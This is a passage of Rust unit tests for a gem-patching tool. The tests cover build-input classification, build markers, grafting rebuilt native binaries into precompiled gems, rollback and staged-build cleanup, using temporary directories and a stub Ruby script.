        let apply = |purl: &'static str, record: HashMap<String, PatchFileInfo>, rebuild: bool| {
            let (copy, blobs, cwd) = (copy.clone(), blobs.clone(), tmp.path().to_path_buf());
            async move {
                apply_gem_package_patch(
                    crate::utils::repo_root::ReadScope::Workspace,
                    purl,
                    &copy.gem_dir,
                    &record,
                    &PatchSources::blobs_only(&blobs),
                    false,
                    MismatchPolicy::Strict,
                    &RubyEnv {
                        cwd,
                        rebuild,
                        offline: true,
                        progress: None,
                    },
                )
                .await
            }
        };
        let ruby_purl = "pkg:gem/a@1?platform=ruby";
        let c_only: HashMap<String, PatchFileInfo> =
            [("patches/lib/0001.patch".to_string(), added.clone())].into();

        let applied = apply(ruby_purl, c_only.clone(), true).await;
        assert!(applied.result.success, "{:?}", applied.result.error);
        assert!(applied.result.files_verified.is_empty());
        assert!(applied.result.files_patched.is_empty());
        assert_eq!(applied.result.error, None);
        assert_eq!(applied.warning, None);
        let Some(GemCaveat::NotInBuild(detail)) = applied.caveat else {
            panic!("no not-in-build caveat: {:?}", applied.caveat);
        };
        assert!(
            detail.contains(
                "none of the patch's files are part of the JRuby build of this gem (a-1-java)"
            ),
            "{detail}"
        );

        // A Java source the copy does not ship: the jars may hold it. The
        // patch is incomplete, and it is whoever compiles: the flag that
        // leaves compiling to the caller leaves nothing to compile here.
        let java_only: HashMap<String, PatchFileInfo> =
            [("ext/java/a/Gone.java".to_string(), info(&"7".repeat(64)))].into();
        for rebuild in [true, false] {
            let applied = apply(ruby_purl, java_only.clone(), rebuild).await;
            // The result is not a failure: nothing here undoes anything.
            assert!(applied.result.success, "rebuild={rebuild}");
            assert_eq!(applied.result.error, None);
            let Some(GemCaveat::Incomplete(detail)) = applied.caveat else {
                panic!("no incomplete caveat: {:?}", applied.caveat);
            };
            assert!(
                detail.contains(JARS_NOT_REBUILT) && detail.contains("Nothing was written"),
                "{detail}"
            );
            // The warning says the same, after the purl.
            assert_eq!(
                applied.warning,
                Some((
                    NOT_REBUILT_REASON.to_string(),
                    format!("{ruby_purl}: {detail}")
                ))
            );
        }

        // The same record written for the copy's own platform is applied
        // strictly: the file it adds is to be written, and with no blob to
        // write it from, that fails. It carries no caveat.
        let applied = apply("pkg:gem/a@1?platform=java", c_only, true).await;
        assert!(!applied.result.success);
        assert_eq!(applied.caveat, None);
    }

    /// The text of an incomplete patch says that the files were written,
    /// which sources are in no compiled code and why, and carries no purl:
    /// the caller puts it after one (the warning, the `Error:` line) or
    /// beside one (the event). A dry run says what `apply` would leave.
    #[test]
    fn the_incomplete_text_says_what_was_written_and_what_is_not_in_effect() {
        let wet = not_compiled_detail("ext/a/a.c", "the build read none of it", false);
        assert!(
            wet.starts_with("the patch's files were written, but its native-extension sources (ext/a/a.c) are not in the compiled code this install runs: the build read none of it."),
            "{wet}"
        );
        assert!(wet.contains("vex does not attest the patch"), "{wet}");
        let dry = not_compiled_detail("ext/a/a.c", "the build read none of it", true);
        assert!(
            dry.starts_with("dry run: apply would write the patch's files, but"),
            "{dry}"
        );
        assert!(dry.contains("would not be in the compiled code"), "{dry}");
        let applied = GemApplied::incomplete(
            untouched_result("pkg:gem/a@1", Path::new("/h/gems/a-1"), None),
            "pkg:gem/a@1",
            wet.clone(),
        );
        assert!(applied.result.success);
        assert_eq!(applied.caveat, Some(GemCaveat::Incomplete(wet.clone())));
        assert_eq!(
            applied.warning,
            Some((
                NOT_REBUILT_REASON.to_string(),
                format!("pkg:gem/a@1: {wet}")
            ))
        );
    }

    /// A build system's manifest is an input wherever it sits, and a gem
    /// that requires from its root says nothing about any file.
    #[test]
    fn classify_native_gem_edges() {
        let facts = built_gem(&["ext/a/extconf.rb"]);
        let scope = classify(
            &facts,
            &files(&["CMakeLists.txt", "NOTES.txt", "Rakefile", "lib/a.rb"]),
        );
        assert_eq!(scope.inputs, ["CMakeLists.txt", "Rakefile"]);
        // Requiring from the root does not make a data file plain; a Ruby
        // file there is still Ruby's to load as it is.
        let rooted = SpecFacts {
            require_paths: vec![".".to_string()],
            ..built_gem(&["ext/a/extconf.rb"])
        };
        assert_eq!(
            classify(&rooted, &files(&["a.rb", "tables.dat"])).inputs,
            ["tables.dat"]
        );
    }

    /// passenger keeps Ruby it runs outside its require path, and its one
    /// extension's script in a dir of its own: a record that changes only
    /// such Ruby, a type signature, a rake task or a test needs no
    /// compiler. What the build reads and compiles is still an input.
    #[test]
    fn classify_runtime_ruby_outside_the_require_paths() {
        let passenger = SpecFacts {
            extensions: ExtensionDecl {
                declared: true,
                entries: vec!["src/helper-scripts/download_binaries/extconf.rb".to_string()],
            },
            require_paths: vec!["src/ruby_supportlib".to_string()],
            ..SpecFacts::default()
        };
        let plain = [
            "src/helper-scripts/rack-loader.rb",
            "src/helper-scripts/prespawn",
            "src/ruby_supportlib/phusion_passenger/loader_shared_helpers.rb",
            "sig/passenger.rbs",
            "tasks/build.rake",
            "build/support/general.rb",
            "t/helper.rb",
            "t/fixtures/app.json",
            "passenger.gemspec",
            "config.ru",
        ];
        let built = [
            "Rakefile",
            "src/agent/Core/Config.h",
            "src/cxx_supportlib/oxt/thread.cpp",
            "src/helper-scripts/download_binaries/extconf.rb",
            "src/helper-scripts/download_binaries/helper.rb",
            "src/ruby_native_extension/extconf.rb",
            "src/schema.yml",
        ];
        let all: Vec<&str> = plain.iter().chain(&built).copied().collect();
        let scope = classify(&passenger, &files(&all));
        // An extension-less file in a dir nothing vouches for (`prespawn`)
        // is not known to be Ruby: it stays an input.
        let mut expected: Vec<&str> = built.to_vec();
        expected.push("src/helper-scripts/prespawn");
        expected.sort();
        assert_eq!(scope.inputs, expected);
        let ruby_only = classify(
            &passenger,
            &files(&["src/helper-scripts/rack-loader.rb", "sig/passenger.rbs"]),
        );
        assert!(ruby_only.inputs.is_empty(), "{:?}", ruby_only.inputs);

        // A gem whose extension rake builds: its rake files are the build.
        for script in ["ext/Rakefile", "ext/a/mkrf_conf.rb"] {
            let raked = built_gem(&[script]);
            let scope = classify(
                &raked,
                &files(&[
                    "tasks/compile.rake",
                    "lib/a.rb",
                    "sig/a.rbs",
                    "support/gen.rb",
                ]),
            );
            assert_eq!(scope.inputs, ["tasks/compile.rake"], "{script}");
        }
        let made = built_gem(&["ext/a/extconf.rb"]);
        assert!(classify(&made, &files(&["tasks/compile.rake"]))
            .inputs
            .is_empty());
    }

    /// A copy an earlier release rebuilt has a marker that lists the
    /// sources that release took for build inputs. A record whose scope is
    /// wider now (a libxml2 patch file beside a C source) is not attested
    /// by it: `apply` rebuilds, and the new marker lists them all.
    #[test]
    fn a_marker_with_fewer_sources_than_the_scope_attests_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path();
        let copy = installed_gem(home, "lib");
        let ext = home.join("extensions/p/3.4.0/a-1/a");
        std::fs::create_dir_all(&ext).unwrap();
        std::fs::write(ext.join("a.so"), b"built").unwrap();
        let hash = compute_git_sha256_from_bytes(b"built");
        let after = "c".repeat(64);
        let record: HashMap<String, PatchFileInfo> = [
            ("ext/a/a.c".to_string(), info(&after)),
            ("patches/0100-fix.patch".to_string(), info(&after)),
        ]
        .into();
        let facts = built_gem(&["ext/a/extconf.rb"]);
        let scope = classify(&facts, &record);
        assert_eq!(scope.inputs, ["ext/a/a.c", "patches/0100-fix.patch"]);
        // What 5.1.0 recorded: the C source alone.
        let narrow = BuildMarker {
            schema: MARKER_SCHEMA,
            sources: [("ext/a/a.c".to_string(), after.clone())].into(),
            extension_dir: "extensions/p/3.4.0/a-1".into(),
            ext_artifacts: [("a/a.so".to_string(), hash)].into(),
            ..BuildMarker::default()
        };
        assert!(!marker_holds(&narrow, &copy, &scope, &record));
        let full = BuildMarker {
            sources: [
                ("ext/a/a.c".to_string(), after.clone()),
                ("patches/0100-fix.patch".to_string(), after),
            ]
            .into(),
            ..narrow.clone()
        };
        assert!(marker_holds(&full, &copy, &scope, &record));
    }

    /// The platform is the dir name's suffix after `<name>-<version>`, or
    /// what the gemspec assigns; the release names the archive.
    #[test]
    fn spec_facts_read_the_release_and_platform() {
        let ruby = SpecFacts::of(
            &to_ruby("ruby-prof", None, &["ext/a/extconf.rb"]),
            "ruby-prof-1.18.3",
        );
        assert_eq!(ruby.platform, None);
        assert_eq!(
            ruby.release.as_ref().map(GemId::full_name).as_deref(),
            Some("ruby-prof-1.18.3")
        );
        assert!(ruby.extensions.declared);
        assert_eq!(ruby.require_paths, ["lib"]);

        // The gemspec's own spelling of the platform may differ from the
        // dir's (an older RubyGems drops `-gnu`): the dir names the archive.
        let linux = SpecFacts::of(
            &to_ruby("nokogiri", Some("x86_64-linux-gnu"), &[]),
            "nokogiri-1.18.3-x86_64-linux",
        );
        assert_eq!(linux.platform.as_deref(), Some("x86_64-linux"));
        assert_eq!(
            linux.release.as_ref().map(GemId::full_name).as_deref(),
            Some("nokogiri-1.18.3-x86_64-linux")
        );

        // A dir that is not this gemspec's release: the assigned platform
        // still marks a platform gem, and there is no archive to name.
        let moved = SpecFacts::of(&to_ruby("nokogiri", Some("java"), &[]), "something-else");
        assert_eq!(moved.platform.as_deref(), Some("java"));
        assert_eq!(moved.release, None);
        // `nokogiri-1.18.30` is not `nokogiri-1.18.3` plus a platform.
        let longer = SpecFacts::of(&to_ruby("nokogiri", None, &[]), "nokogiri-1.18.30");
        assert_eq!((longer.platform, longer.release), (None, None));
        // `s.platform = Gem::Platform::RUBY` assigns no string.
        let explicit = "Gem::Specification.new do |s|\n  s.name = \"a\"\n  s.version = \"1\"\n  \
                        s.platform = Gem::Platform::RUBY\nend\n";
        assert_eq!(SpecFacts::of(explicit, "a-1").platform, None);
    }

    #[test]
    fn ruby_facts_parse() {
        let facts = parse_ruby_facts(
            "noise\nsp_extensions_dir\t/h/extensions/arm64-darwin-25/3.4.0\n\
             sp_ruby\t3.4.10\t4.0.15\tbundle\tarm64-darwin-25\tyes\n",
        )
        .unwrap();
        assert_eq!(facts.minor().as_deref(), Some("3.4"));
        assert_eq!(facts.dlext, "bundle");
        assert_eq!(facts.runs_platform, Some(true));
        assert_eq!(facts.versions().ruby.as_deref(), Some("3.4.10"));
        let unasked = parse_ruby_facts("sp_ruby\t3.3.0\t3.5.3\tso\tx86_64-linux\t\n").unwrap();
        assert_eq!(unasked.runs_platform, None);
        let other = parse_ruby_facts("sp_ruby\t3.3.0\t3.5.3\tso\tx86_64-linux\tno\n").unwrap();
        assert_eq!(other.runs_platform, Some(false));
        for unreadable in ["", "sp_ruby\t3.4.10\n", "sp_extensions_dir\t/x\n"] {
            assert_eq!(parse_ruby_facts(unreadable), None, "{unreadable:?}");
        }
        assert_eq!(
            tagged_lines(
                "sp_missing\ta\t~> 1.0\nx\nsp_missing\tb\t>= 0,< 2\n",
                "sp_missing"
            ),
            [vec!["a", "~> 1.0"], vec!["b", ">= 0,< 2"]]
        );
        assert_eq!(
            abi_of_home(Path::new("/p/vendor/bundle/ruby/3.4.0")).as_deref(),
            Some("3.4.0")
        );
        assert_eq!(abi_of_home(Path::new("/opt/gems")), None);
    }

    // ── a precompiled copy ──────────────────────────────────────────────

    const PREBUILT: &[u8] = b"\xcf\xfa\xed\xfe prebuilt";

    /// A precompiled `a-1-arm64-darwin` copy in `home`, with a prebuilt
    /// binary for Ruby 3.3 and 3.4 in the rake-compiler layout.
    fn precompiled_gem(home: &Path) -> GemCopy {
        let gem_dir = home.join("gems/a-1-arm64-darwin");
        for minor in ["3.3", "3.4"] {
            let dir = gem_dir.join("lib/a").join(minor);
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("a.bundle"), PREBUILT).unwrap();
        }
        std::fs::create_dir_all(gem_dir.join("ext/a")).unwrap();
        std::fs::write(gem_dir.join("ext/a/a.c"), b"int a;").unwrap();
        std::fs::create_dir_all(home.join("specifications")).unwrap();
        std::fs::write(
            home.join("specifications/a-1-arm64-darwin.gemspec"),
            "Gem::Specification.new do |s|\n  s.name = \"a\".freeze\n  \
             s.version = \"1\".freeze\n  s.platform = \"arm64-darwin\".freeze\n  \
             s.require_paths = [\"lib\".freeze]\nend\n",
        )
        .unwrap();
        GemCopy::of(&gem_dir).unwrap()
    }

    fn probe_for(copy: &GemCopy, ruby_version: &str) -> Probe {
        Probe {
            ruby: PathBuf::from("/r"),
            gem_dir: copy.gem_dir.clone(),
            extension_dir: copy.home.join("extensions/p/3.4.0").join(&copy.full_name),
            require_path: "lib".to_string(),
            require_paths: vec!["lib".to_string()],
            lib_dir: copy.gem_dir.join("lib"),
            facts: Some(RubyFacts {
                ruby_version: ruby_version.to_string(),
                rubygems_version: "3.6.9".to_string(),
                dlext: "bundle".to_string(),
                platform: "arm64-darwin-25".to_string(),
                runs_platform: Some(true),
            }),
        }
    }

    /// A build of the source gem `a-1` in the stage home `stage`: its
    /// extension dir holds `rels`, each with the bytes `built`.
    fn staged_build(stage: &Path, rels: &[&str], built: &[u8]) -> StagedBuild {
        let label = "extensions/arm64-darwin-25/3.4.0/a-1".to_string();
        let extension_dir = stage.join(&label);
        let gem_dir = stage.join("gems/a-1");
        for rel in rels {
            for base in [&extension_dir, &gem_dir.join("lib")] {
                let path = base.join(rel);
                std::fs::create_dir_all(path.parent().unwrap()).unwrap();
                std::fs::write(path, built).unwrap();
            }
        }
        std::fs::write(extension_dir.join(BUILD_COMPLETE), b"").unwrap();
        std::fs::write(extension_dir.join("gem_make.out"), b"log").unwrap();
        StagedBuild {
            gem: StagedGem {
                gem_dir,
                spec_path: stage.join("specifications/a-1.gemspec"),
            },
            extension_dir,
            label,
        }
    }

    /// The build is matched to the binary the gem keeps for the building
    /// Ruby's minor; a single binary kept elsewhere is matched by name; no
    /// counterpart, or several, is refused.
    #[test]
    fn a_graft_replaces_the_binary_ruby_loads() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = precompiled_gem(&tmp.path().join("home"));
        let staged = staged_build(&tmp.path().join("stage"), &["a/a.bundle", "a/a.rb"], b"new");

        let grafts = plan_graft(&copy, &probe_for(&copy, "3.4.10"), &staged).unwrap();
        assert_eq!(grafts.len(), 1, "only the loadable extension is grafted");
        assert_eq!(grafts[0].target, "lib/a/3.4/a.bundle");
        assert_eq!(grafts[0].staged, staged.extension_dir.join("a/a.bundle"));
        let older = plan_graft(&copy, &probe_for(&copy, "3.3.6"), &staged).unwrap();
        assert_eq!(older[0].target, "lib/a/3.3/a.bundle");

        // No binary for this Ruby, and two that share the name.
        let why = plan_graft(&copy, &probe_for(&copy, "3.5.0"), &staged).unwrap_err();
        assert!(why.contains("no prebuilt a.bundle for Ruby 3.5"), "{why}");
        assert!(
            why.contains("lib/a/3.3/a.bundle, lib/a/3.4/a.bundle"),
            "{why}"
        );

        // One binary, wherever the gem keeps it.
        std::fs::remove_dir_all(copy.gem_dir.join("lib/a/3.3")).unwrap();
        std::fs::rename(
            copy.gem_dir.join("lib/a/3.4/a.bundle"),
            copy.gem_dir.join("lib/a.bundle"),
        )
        .unwrap();
        let single = plan_graft(&copy, &probe_for(&copy, "3.5.0"), &staged).unwrap();
        assert_eq!(single[0].target, "lib/a.bundle");

        std::fs::remove_file(copy.gem_dir.join("lib/a.bundle")).unwrap();
        let why = plan_graft(&copy, &probe_for(&copy, "3.4.10"), &staged).unwrap_err();
        assert!(why.contains("no prebuilt a.bundle"), "{why}");

        // A build that left no loadable extension has nothing to graft.
        let empty = staged_build(&tmp.path().join("stage2"), &["a/a.rb"], b"new");
        let why = plan_graft(&copy, &probe_for(&copy, "3.4.10"), &empty).unwrap_err();
        assert!(why.contains("no .bundle extension"), "{why}");
    }

    /// A graft is attested like a rebuilt extension dir: only while the
    /// marker's sources are the record's and the replaced binary still has
    /// the built bytes. Rollback puts the prebuilt binary back, bytes and
    /// mode, and removes what the patch added to the copy.
    #[tokio::test]
    async fn a_grafted_copy_is_attested_and_rolled_back() {
        let tmp = tempfile::tempdir().unwrap();
        // A project's bundle path, as Bundler lays it out for Ruby 3.4.
        let home = tmp.path().join("vendor/bundle/ruby/3.4.0");
        let copy = precompiled_gem(&home);
        let target = copy.gem_dir.join("lib/a/3.4/a.bundle");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(&target, std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        let before_c = compute_git_sha256_from_bytes(b"int a;");
        let record: HashMap<String, PatchFileInfo> = [
            (
                "ext/a/a.c".to_string(),
                PatchFileInfo {
                    before_hash: before_c,
                    after_hash: "c".repeat(64),
                },
            ),
            // In the source gem alone: the precompiled copy never had it.
            (
                "patches/0001.patch".to_string(),
                PatchFileInfo {
                    before_hash: "b".repeat(64),
                    after_hash: "d".repeat(64),
                },
            ),
        ]
        .into();
        let gem = InstalledGem::at(&copy.gem_dir).await;
        assert!(gem.copy.is_some());
        let scope = gem.scope(&record);
        assert_eq!(scope.inputs, ["ext/a/a.c", "patches/0001.patch"]);
        assert_eq!(scope.precompiled.as_deref(), Some("arm64-darwin"));
        assert_eq!(
            verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            Err(NOT_REBUILT_REASON.to_string()),
            "patched sources over the prebuilt binary attest nothing"
        );

        // The copy takes the file it never shipped as an addition.
        let (installed, absent) = files_as_installed(&copy, &scope, &record).await;
        assert_eq!(absent, ["patches/0001.patch"]);
        assert_eq!(installed["patches/0001.patch"].before_hash, "");
        assert_eq!(installed["ext/a/a.c"], record["ext/a/a.c"]);

        let staged = staged_build(&tmp.path().join("stage"), &["a/a.bundle"], b"rebuilt");
        let grafts = plan_graft(&copy, &probe_for(&copy, "3.4.10"), &staged).unwrap();
        assert!(back_up_prebuilt(&copy, &grafts, &absent).unwrap());
        assert!(
            !back_up_prebuilt(&copy, &grafts, &["patches/0002.patch".to_string()]).unwrap(),
            "the original is backed up once"
        );
        graft_binaries(&copy, &scope, &record, &grafts).unwrap();
        assert_eq!(std::fs::read(&target).unwrap(), b"rebuilt");
        assert_eq!(
            std::fs::read(copy.gem_dir.join("lib/a/3.3/a.bundle")).unwrap(),
            PREBUILT,
            "another Ruby's binary is not this build's to replace"
        );
        let marker = read_marker_sync(&copy.gem_dir).unwrap();
        assert!(marker.grafted);
        assert_eq!(marker.schema, GRAFT_MARKER_SCHEMA);
        assert_eq!(
            marker.lib_artifacts.keys().collect::<Vec<_>>(),
            ["lib/a/3.4/a.bundle"]
        );
        assert_eq!(
            verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            Ok(())
        );

        // Another record, or a binary that is no longer the built one.
        let mut other = record.clone();
        other.get_mut("ext/a/a.c").unwrap().after_hash = "e".repeat(64);
        assert!(verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &other)
            .await
            .is_err());
        std::fs::write(&target, b"reinstalled").unwrap();
        assert!(verify_native_build(&copy.gem_dir, "pkg:gem/a@1", &record)
            .await
            .is_err());
        std::fs::write(&target, b"rebuilt").unwrap();

        // Rollback: the added file is removed (an empty `beforeHash`), the
        // one the copy shipped is restored.
        let undo = rollback_files(&copy.gem_dir, "pkg:gem/a@1", &record).await;
        assert_eq!(undo["patches/0001.patch"].before_hash, "");
        assert_eq!(undo["ext/a/a.c"], record["ext/a/a.c"]);
        let env = RubyEnv {
            cwd: home.clone(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(true));
        assert_eq!(std::fs::read(&target).unwrap(), PREBUILT);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&target).unwrap().permissions().mode();
            assert_eq!(mode & 0o777, 0o755, "the binary keeps its mode");
        }
        assert!(!copy.gem_dir.join(MARKER_FILE).exists());
        assert!(!copy.gem_dir.join(BACKUP_DIR).exists());
        assert_eq!(
            rollback_files(&copy.gem_dir, "pkg:gem/a@1", &record).await,
            record
        );
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(false));
    }

    /// A marker speaks for the kind of copy it was written for, and a
    /// grafted one must name what it replaced.
    #[test]
    fn a_marker_of_the_wrong_kind_attests_nothing() {
        let tmp = tempfile::tempdir().unwrap();
        let copy = precompiled_gem(&tmp.path().join("ruby/3.4.0"));
        let after = "c".repeat(64);
        let record: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&after))].into();
        let scope = NativeScope {
            inputs: vec!["ext/a/a.c".into()],
            precompiled: Some("arm64-darwin".into()),
            ..NativeScope::default()
        };
        let grafted = BuildMarker {
            schema: GRAFT_MARKER_SCHEMA,
            sources: [("ext/a/a.c".to_string(), after.clone())].into(),
            lib_artifacts: [(
                "lib/a/3.4/a.bundle".to_string(),
                compute_git_sha256_from_bytes(PREBUILT),
            )]
            .into(),
            grafted: true,
            ..BuildMarker::default()
        };
        assert!(marker_holds(&grafted, &copy, &scope, &record));
        // Nothing replaced: nothing attested.
        let empty = BuildMarker {
            lib_artifacts: BTreeMap::new(),
            ..grafted.clone()
        };
        assert!(!marker_holds(&empty, &copy, &scope, &record));
        // A gem RubyGems builds is not attested by a graft, nor a
        // precompiled one by an extension dir's marker.
        let built = NativeScope {
            builds_extensions: true,
            precompiled: None,
            ..scope.clone()
        };
        assert!(!marker_holds(&grafted, &copy, &built, &record));
        let dir_marker = BuildMarker {
            schema: MARKER_SCHEMA,
            grafted: false,
            extension_dir: "extensions/p/3.4.0/a-1-arm64-darwin".into(),
            ..grafted.clone()
        };
        assert!(!marker_holds(&dir_marker, &copy, &scope, &record));

        // On disk: each schema is read only in its own shape.
        let write = |marker: &BuildMarker| {
            std::fs::write(
                copy.gem_dir.join(MARKER_FILE),
                serde_json::to_vec(marker).unwrap(),
            )
            .unwrap();
            read_marker_sync(&copy.gem_dir)
        };
        assert_eq!(write(&grafted), Some(grafted.clone()));
        assert_eq!(write(&dir_marker), Some(dir_marker.clone()));
        for (schema, is_graft) in [
            (MARKER_SCHEMA, true),
            (GRAFT_MARKER_SCHEMA, false),
            (3, true),
        ] {
            let odd = BuildMarker {
                schema,
                grafted: is_graft,
                ..grafted.clone()
            };
            assert_eq!(write(&odd), None, "schema {schema}, grafted {is_graft}");
        }
        // The marker a release before the graft wrote still reads.
        std::fs::write(
            copy.gem_dir.join(MARKER_FILE),
            "{\"schema\":1,\"sources\":{},\"extensionDir\":\"extensions/p/3.4.0/a-1\",\
             \"extArtifacts\":{},\"libArtifacts\":{}}",
        )
        .unwrap();
        assert!(read_marker_sync(&copy.gem_dir).is_some_and(|m| !m.grafted));
    }

    // ── a build staged from the source gem ──────────────────────────────

    /// A staged build takes the place of the installed extension dir and
    /// its `lib/` copies, with the original backed up and the marker
    /// written, as an in-place rebuild leaves them; rollback restores it.
    #[tokio::test]
    async fn a_staged_build_replaces_the_installed_one() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        let ext = home.join("extensions/p/3.4.0/a-1");
        std::fs::create_dir_all(ext.join("a")).unwrap();
        std::fs::write(ext.join("a/a.so"), b"original").unwrap();
        std::fs::write(ext.join(BUILD_COMPLETE), b"").unwrap();
        std::fs::create_dir_all(copy.gem_dir.join("lib/a")).unwrap();
        std::fs::write(copy.gem_dir.join("lib/a/a.so"), b"original").unwrap();
        let probe = Probe {
            ruby: PathBuf::from("/r"),
            gem_dir: copy.gem_dir.clone(),
            extension_dir: ext.clone(),
            require_path: "lib".to_string(),
            require_paths: vec!["lib".to_string()],
            lib_dir: copy.gem_dir.join("lib"),
            facts: None,
        };
        let stage = open_stage(&copy).unwrap();
        assert!(stage.home.starts_with(&home), "staged inside the gem home");
        let label = "extensions/p/3.4.0/a-1".to_string();
        let staged_ext = stage.home.join(&label);
        let staged_gem = stage.home.join("gems/a-1");
        std::fs::create_dir_all(staged_ext.join("a")).unwrap();
        std::fs::create_dir_all(staged_gem.join("lib/a")).unwrap();
        std::fs::write(staged_ext.join("a/a.so"), b"rebuilt").unwrap();
        std::fs::write(staged_ext.join(BUILD_COMPLETE), b"").unwrap();
        std::fs::write(staged_gem.join("lib/a/a.so"), b"rebuilt").unwrap();
        let built = StagedBuild {
            gem: StagedGem {
                gem_dir: staged_gem,
                spec_path: stage.home.join("specifications/a-1.gemspec"),
            },
            extension_dir: staged_ext,
            label,
        };
        let after = "c".repeat(64);
        let record: HashMap<String, PatchFileInfo> =
            [("ext/a/a.c".to_string(), info(&after))].into();
        let scope = NativeScope {
            inputs: vec!["ext/a/a.c".into()],
            builds_extensions: true,
            ..NativeScope::default()
        };

        // A build for another ABI is not this copy's.
        let foreign = StagedBuild {
            label: "extensions/p/3.3.0/a-1".to_string(),
            ..built.clone()
        };
        let why = install_staged_build(&copy, &probe, &scope, &record, &foreign, Some(&[]));
        assert!(why.unwrap_err().contains("not the installed extension's"));
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"original");
        assert!(!copy.gem_dir.join(BACKUP_DIR).exists());

        install_staged_build(&copy, &probe, &scope, &record, &built, Some(&[])).unwrap();
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"rebuilt");
        assert!(ext.join(BUILD_COMPLETE).is_file());
        assert_eq!(
            std::fs::read(copy.gem_dir.join("lib/a/a.so")).unwrap(),
            b"rebuilt"
        );
        assert!(!parked_build_path(&ext).exists());
        let marker = read_marker_sync(&copy.gem_dir).unwrap();
        assert_eq!(marker.schema, MARKER_SCHEMA);
        assert!(marker_holds(&marker, &copy, &scope, &record));
        close_stage(stage, &copy).await;
        assert!(!home.join(BUILD_STAGE_DIR).exists(), "the stage is gone");

        let env = RubyEnv {
            cwd: home.clone(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        assert_eq!(restore_original_build(&copy.gem_dir, &env).await, Ok(true));
        assert_eq!(std::fs::read(ext.join("a/a.so")).unwrap(), b"original");
        assert_eq!(
            std::fs::read(copy.gem_dir.join("lib/a/a.so")).unwrap(),
            b"original"
        );
    }

    /// A stage an interrupted run left is only disk space: the next run of
    /// the copy drops it. One a live run holds is left to that run.
    #[cfg(unix)]
    #[test]
    fn a_stale_stage_is_swept_and_a_live_one_is_not() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("home");
        let copy = installed_gem(&home, "lib");
        let root = stage_root(&copy);
        std::fs::create_dir_all(root.join("home/gems/a-1")).unwrap();
        std::fs::write(root.join("home/gems/a-1/half"), b"x").unwrap();

        // Left behind: recovery (the start of `apply` and `rollback`)
        // removes it and the dir that held it.
        assert!(!recover_interrupted_rebuild_sync(&copy, Some("lib")).unwrap());
        assert!(!home.join(BUILD_STAGE_DIR).exists());

        // Held by a run that is still building.
        let stage = open_stage(&copy).unwrap();
        let refused = sweep_stale_stage(&copy).unwrap_err();
        assert_eq!(refused.kind(), std::io::ErrorKind::WouldBlock);
        let busy = open_stage(&copy).err().unwrap();
        assert!(matches!(busy, StageFailure::Busy(_)), "{busy:?}");
        let why = busy.describe();
        assert!(why.contains("right now"), "{why}");
        assert!(stage.home.is_dir());
        drop(stage);
        // The holder gone: a sibling test forking right now keeps a copy
        // of the descriptor, and the lock with it, until it execs.
        loop {
            match sweep_stale_stage(&copy) {
                Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                    std::thread::sleep(Duration::from_millis(10));
                }
                swept => break swept.unwrap(),
            }
        }
        assert!(!root.exists());

        // A link planted where the stage goes is not written through.
        let elsewhere = tmp.path().join("elsewhere");
        std::fs::create_dir_all(&elsewhere).unwrap();
        std::os::unix::fs::symlink(&elsewhere, home.join(BUILD_STAGE_DIR)).unwrap();
        let why = open_stage(&copy).err().unwrap().describe();
        assert!(why.contains("is not a directory"), "{why}");
        assert_eq!(std::fs::read_dir(&elsewhere).unwrap().count(), 0);
    }

    /// A stand-in `ruby` for a precompiled copy's probe: it builds
    /// extensions into `<home>/extensions/<platform dir>/<abi>` and says
    /// `runs` when asked whether it runs the gem's platform.
    #[cfg(unix)]
    fn fake_platform_ruby(dir: &Path, platform_dir: &str, abi: &str, runs: &str) -> PathBuf {
        use std::os::unix::fs::PermissionsExt;
        std::fs::create_dir_all(dir).unwrap();
        let ruby = dir.join("ruby");
        std::fs::write(
            &ruby,
            format!(
                "#!/bin/sh\nprintf '%s\\n' \"$3 $4 $5\" >> '{}'\n\
                 printf 'sp_extensions_dir\\t%s\\n' \"$4/extensions/{platform_dir}/{abi}\"\n\
                 printf 'sp_ruby\\t3.4.10\\t3.6.9\\tbundle\\t{platform_dir}\\t{runs}\\n'\n",
                dir.join("calls").display()
            ),
        )
        .unwrap();
        std::fs::set_permissions(&ruby, std::fs::Permissions::from_mode(0o755)).unwrap();
        ruby
    }

    /// [`find_ruby`] for a precompiled copy, over a script written a moment ago
    /// ([`find_fresh_ruby`] says why it is tried again).
    #[cfg(unix)]
    async fn find_fresh_platform_ruby(
        copy: &GemCopy,
        env: &RubyEnv,
        preflight: &Preflight,
    ) -> Result<Probe, String> {
        loop {
            match find_ruby(copy, env, preflight.clone(), Some("arm64-darwin")).await {
                Err(why) if why.contains("os error 26") => {
                    tokio::time::sleep(Duration::from_millis(20)).await;
                }
                found => return found,
            }
        }
    }

    /// A precompiled copy has no extension dir to match a Ruby to. Its
    /// owner runs the gem's platform and builds for the ABI the home's
    /// other native gems were built for, or, in a home with none, the ABI
    /// the home's dir name carries.
    #[cfg(unix)]
    #[tokio::test]
    async fn a_precompiled_copys_ruby_is_matched_by_platform_and_abi() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tmp.path().join("vendor/bundle/ruby/3.4.0");
        let copy = precompiled_gem(&home);
        let env = RubyEnv {
            cwd: tmp.path().to_path_buf(),
            rebuild: true,
            offline: true,
            progress: None,
        };
        let bin = tmp.path().join("bin");
        let preflight = |candidates: Vec<PathBuf>| {
            let installed = extension_dir_slots(&copy)
                .iter()
                .filter_map(|slot| slot.parent().map(Path::to_path_buf))
